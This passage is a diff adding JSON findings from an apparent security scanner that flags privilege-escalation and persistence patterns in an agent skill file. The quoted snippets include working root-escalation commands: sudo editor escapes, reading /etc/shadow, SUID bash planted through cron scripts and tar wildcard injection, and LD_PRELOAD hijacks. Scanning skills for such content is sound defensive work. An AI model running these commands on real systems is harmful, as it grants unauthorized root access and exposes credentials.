+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 553,
+              "end_line": null,
+              "start_column": 17
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-45bae6379e8042349a183938e4c66858",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 562,
+            "end_line": null,
+            "start_column": 19
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "  DirtyPipe  -> kernel 5.8-5.16\n  PwnKit     -> polkit pkexec (most distros)\n  DirtyCow   -> kernel 2.x-4.x\n  Baron Samedit -> sudo 1.8.2-1.9.5p1\n\nCLEANUP\n  Remove SUID shells from /tmp",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 562,
+              "end_line": null,
+              "start_column": 19
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-95f74435acb342cb91cd93347351ad25",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 131,
+            "end_line": null,
+            "start_column": 3
+          },
+          "finding": "Sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n---\n\n## Sudo Misconfigurations\n\nSudo rules are the most common privilege escalation vector in real engagements. Check `sudo -l` immediately upon gaining a shell.\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "1c8a952c0c670be1b88d2a3c3b22cb906deea40cf3509d002cd5c2005202e6a1",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 131,
+              "end_line": null,
+              "start_column": 3
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-f478047a7aa24b32abfb60463b374907",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 509,
+            "end_line": null,
+            "start_column": 2
+          },
+          "finding": "Sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "| LinPEAS/enumeration | Process execution of curl piped to sh, large bursts of file access in /proc, /etc, /sys |\n| SUID abuse | Execution of SUID binaries from unusual parent processes, shell spawning from SUID context |\n| Capabilities abuse | Unexpected setuid(0) calls from non-SUID processes, audit logs for CAP_SETUID usage |\n| Sudo exploitation | Auth logs showing sudo usage for unusual commands, sudoers file modification timestamps |\n| CVE-2021-3156 | sudoedit crash logs, coredumps, heap corruption signatures in audit logs |\n| Cron hijacking | Modified cron scripts (integrity monitoring), new files with tar flag names |\n| /etc/passwd writes | File integrity monitoring alerts, new UID 0 entries, inotify watches |",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "1c8a952c0c670be1b88d2a3c3b22cb906deea40cf3509d002cd5c2005202e6a1",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 509,
+              "end_line": null,
+              "start_column": 2
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-3efa108d4cb748de883c2c7ddfaa449d",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 546,
+            "end_line": null,
+            "start_column": 47
+          },
+          "finding": "Sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\nPHASE 2 -- QUICK WINS\n  GTFOBins lookup for SUID/sudo binaries     # https://gtfobins.github.io\n  sudo vim -c '!bash'                        # Sudo escape\n  python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'  # cap_setuid\n  bash -p                                    # SUID bash\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "1c8a952c0c670be1b88d2a3c3b22cb906deea40cf3509d002cd5c2005202e6a1",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 546,
+              "end_line": null,
+              "start_column": 47
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-c770df507b7a475fa7c5a2e4ed1b7160",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 133,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "Sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n## Sudo Misconfigurations\n\nSudo rules are the most common privilege escalation vector in real engagements. Check `sudo -l` immediately upon gaining a shell.\n\n```bash\n# List sudo permissions for current user",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "1c8a952c0c670be1b88d2a3c3b22cb906deea40cf3509d002cd5c2005202e6a1",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 133,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-7cd3f2291a7a40ecafc8d914facf7698",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 136,
+            "end_line": null,
+            "start_column": 7
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "Sudo rules are the most common privilege escalation vector in real engagements. Check `sudo -l` immediately upon gaining a shell.\n\n```bash\n# List sudo permissions for current user\nsudo -l\nsudo --version\ncat /etc/sudoers 2>/dev/null",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 136,
+              "end_line": null,
+              "start_column": 7
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-ca828db70863480dae8d017ddd8aa606",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 145,
+            "end_line": null,
+            "start_column": 5
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "### NOPASSWD Exploitation\n\n```bash\n# If sudo allows vi/vim NOPASSWD\nsudo vim -c '!bash'\n\n# If sudo allows less NOPASSWD",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 145,
+              "end_line": null,
+              "start_column": 5
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-e271afbfe77f41c09382fd993f067de5",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 146,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n```bash\n# If sudo allows vi/vim NOPASSWD\nsudo vim -c '!bash'\n\n# If sudo allows less NOPASSWD\nsudo less /etc/shadow",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 146,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-30eeb8da4b2e495ea0e420876298b826",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 165,
+            "end_line": null,
+            "start_column": 5
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "echo '/bin/bash' > /path/to/writable_script.sh\nsudo /path/to/writable_script.sh\n\n# If sudo allows running as another user\nsudo -u targetuser /bin/bash\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 165,
+              "end_line": null,
+              "start_column": 5
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-524e47cdcdff4070a2c4ce027292fa92",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 166,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo /path/to/writable_script.sh\n\n# If sudo allows running as another user\nsudo -u targetuser /bin/bash\n```\n\n### Baron Samedit -- CVE-2021-3156",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 166,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-6c9215238e704f49a64887d959741984",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 172,
+            "end_line": null,
+            "start_column": 23
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "### Baron Samedit -- CVE-2021-3156\n\n```bash\n# Check if vulnerable (sudo 1.8.2 through 1.8.31p2, 1.9.0 through 1.9.5p1)\nsudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')\n# If it crashes/segfaults, it is likely vulnerable\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 172,
+              "end_line": null,
+              "start_column": 23
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-3ec54f72c16c48aaa9e42b08093a50af",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 186,
+            "end_line": null,
+            "start_column": 140
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "cat /etc/os-release\n```\n\nThis heap-based buffer overflow in sudoedit affects a wide range of Linux distributions. It provides direct root access without needing any sudo permissions.\n\n---\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 186,
+              "end_line": null,
+              "start_column": 140
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-8e18609e1fa048f5831dff3b89b74f2b",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 409,
+            "end_line": null,
+            "start_column": 37
+          },
+          "finding": "sudo\n",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "### LD_PRELOAD\n\n```c\n// preload.c -- compile and load via sudo\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 409,
+              "end_line": null,
+              "start_column": 37
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-360b48530ad74c188c09728303dc7c3e",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 425,
+            "end_line": null,
+            "start_column": 15
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "# Compile\ngcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c\n\n# Execute with sudo (requires env_keep += LD_PRELOAD in sudoers)\nsudo LD_PRELOAD=/tmp/preload.so /usr/bin/any_allowed_command\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 425,
+              "end_line": null,
+              "start_column": 15
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-319a10c21ef348679a930e57c52f2b5c",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 426,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c\n\n# Execute with sudo (requires env_keep += LD_PRELOAD in sudoers)\nsudo LD_PRELOAD=/tmp/preload.so /usr/bin/any_allowed_command\n```\n\n### LD_LIBRARY_PATH",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 426,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-33c7a14b4c20468fbf5ef68fb443f1cb",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 439,
+            "end_line": null,
+            "start_column": 15
+          },
+          "finding": "sudo\n",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "# Target a library like libcrypt.so.1\ngcc -fPIC -shared -o /tmp/libcrypt.so.1 preload.c\n\n# Execute with sudo\nsudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 439,
+              "end_line": null,
+              "start_column": 15
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-0f7c80d4c2564a81b09c0d838ad6e00a",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 440,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "gcc -fPIC -shared -o /tmp/libcrypt.so.1 preload.c\n\n# Execute with sudo\nsudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2\n```\n\nYou can also hijack shared libraries loaded by SUID binaries. Use `strace` to find missing library loads from writable directories, then place your malicious `.so` there.",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 440,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-8ad9e2eb634d4b458d280adc3293fe85",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 522,
+            "end_line": null,
+            "start_column": 27
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n```bash\n# Defenders should monitor\n/var/log/auth.log        # sudo usage, su attempts, authentication events\n/var/log/syslog          # system events, cron execution\n/var/log/kern.log        # kernel exploits, crashes\n/var/log/audit/audit.log # auditd events (execve, capability use, file access)",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 522,
+              "end_line": null,
+              "start_column": 27
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "RA2",
+          "finding_id": "finding-5309a6e147df4546b912f6172ff060a6",
+          "category": "Rogue Agent",
+          "pattern": "Session Persistence",
+          "severity": "MEDIUM",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 203,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "crontab -l",
+          "explanation": "Skill establishes unauthorized persistence across sessions via cron jobs, startup scripts, or state files. Session persistence allows an attacker to maintain access beyond the current interaction.",
+          "remediation": "Remove any persistence mechanisms (cron jobs, startup scripts, state files). Skills should not maintain state across sessions without explicit user consent.",
+          "code_snippet": "ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/\n\n# User crontabs\ncrontab -l\nls -la /var/spool/cron/crontabs/ 2>/dev/null\n\n# Use pspy to discover hidden cron jobs",
+          "intent": null,
+          "tags": [
+            "Rogue Agent"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ae94da2449e2e257253c9244c39b330c10fe1283ba753053b5109d492e5143fa",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 203,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "RA2",
+          "finding_id": "finding-be46f17a06204d8ca8d6d23de1185216",
+          "category": "Rogue Agent",
+          "pattern": "Session Persistence",
+          "severity": "MEDIUM",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 210,
+            "end_line": null,
+            "start_column": 28
+          },
+          "finding": "crontab /etc/cron.d/ 2>/",
+          "explanation": "Skill establishes unauthorized persistence across sessions via cron jobs, startup scripts, or state files. Session persistence allows an attacker to maintain access beyond the current interaction.",
+          "remediation": "Remove any persistence mechanisms (cron jobs, startup scripts, state files). Skills should not maintain state across sessions without explicit user consent.",
+          "code_snippet": "./pspy64 -pf -i 1000\n\n# Check for writable scripts called by cron\nfor f in $(grep -r '/' /etc/crontab /etc/cron.d/ 2>/dev/null | grep -oP '/\\S+'); do\n    ls -la \"$f\" 2>/dev/null\ndone\n```",
+          "intent": null,
+          "tags": [
+            "Rogue Agent"
+          ],
+          "evidence": {},
+          "match_fingerprint": "b22b1534dd100e68cfef9badf4e403bef863c572a28c21cbee82bf3c7231e48f",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 210,
+              "end_line": null,
+              "start_column": 28
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-7f2a276894904dc5a24e9daf7adbdfd7",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 219,
+            "end_line": null,
+            "start_column": 36
+          },
+          "finding": "chmod +s",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n```bash\n# If a root cron job calls a writable script\necho 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/writable_cron_script.sh\n\n# Wait for cron execution, then\n/tmp/rootbash -p",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "5031fa99866e3c59459126dd4f19981b0da9b3c7ad85ce1c865a4229605473ba",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 219,
+              "end_line": null,
+              "start_column": 36
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-7aedb53e54a44b82b33c3ac602cfd735",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 231,
+            "end_line": null,
+            "start_column": 36
+          },
+          "finding": "chmod +s",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "# If crontab has PATH=/home/user/bin:/usr/local/sbin:...\n# And a cron job calls \"backup.sh\" without full path\necho '#!/bin/bash' > /home/user/bin/backup.sh\necho 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/bin/backup.sh\nchmod +x /home/user/bin/backup.sh\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "5031fa99866e3c59459126dd4f19981b0da9b3c7ad85ce1c865a4229605473ba",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 231,
+              "end_line": null,
+              "start_column": 36
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-d38f58eba3e348c3a3b1c9f43afcbdfc",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 244,
+            "end_line": null,
+            "start_column": 36
+          },
+          "finding": "chmod +s",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "echo '' > '--checkpoint=1'\necho '' > '--checkpoint-action=exec=sh privesc.sh'\necho '#!/bin/bash' > privesc.sh\necho 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> privesc.sh\nchmod +x privesc.sh\n\n# Similar attack with rsync wildcard",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "5031fa99866e3c59459126dd4f19981b0da9b3c7ad85ce1c865a4229605473ba",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 244,
+              "end_line": null,
+              "start_column": 36
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-92a45b95081d4ac9be8e12155fbf3396",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 300,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "chmod +s",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n# Create a SUID shell\ncp /bin/bash /tmp/nfs_mount/rootbash\nchmod +s /tmp/nfs_mount/rootbash\n\n# On the target\n/shared_directory/rootbash -p",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "5031fa99866e3c59459126dd4f19981b0da9b3c7ad85ce1c865a4229605473ba",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 300,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-070760df251d4476a69d61965170e929",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 392,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "chmod +s",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
